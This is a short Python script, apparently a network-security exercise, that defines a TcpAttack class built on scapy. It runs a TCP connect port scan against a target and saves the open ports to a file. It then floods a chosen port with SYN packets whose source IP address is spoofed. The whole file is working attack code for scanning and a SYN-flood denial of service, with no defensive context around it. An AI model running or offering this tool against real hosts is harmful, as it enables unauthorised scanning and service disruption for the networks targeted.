import sys
import socket
from scapy.all import *

class TcpAttack:
    def __init__(self, spoofIP:str, targetIP:str) -> None:
        self.spoofIP = spoofIP
        self.targetIP = targetIP
    
    def scanTarget(self, rangeStart:int, rangeEnd:int) -> None:
        open_ports = []
        for testport in range(rangeStart, rangeEnd+1):
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.1)
            try:
                sock.connect((self.targetIP, testport))
                open_ports.append(testport)
            except:
                pass
        
        with open("openports.txt", 'w') as OUT:
                for port in open_ports:
                    OUT.write(f"{port}\n")

    def attackTarget(self, port:int, numSyn:int) -> int:
        for i in range(numSyn):
            IP_header = IP(src=self.spoofIP, dst=self.targetIP)
            TCP_header = TCP(flags="S", sport=RandShort(), dport=port)
            packet = IP_header / TCP_header
            try:
                send(packet)
            except Exception as e:
                print(e)
                return 0
        return 1

if __name__ == "__main__":
    spoofIP = ''
    targetIP = ''
    rangeStart = 1000
    rangeEnd = 4000
    port = 1716
    numSyn = 100

    tcp = TcpAttack(spoofIP, targetIP)
    tcp.scanTarget(rangeStart, rangeEnd)
    if tcp.attackTarget(port, numSyn):
        print(f"Port {port} was open and flooded with {numSyn} SYN packets")


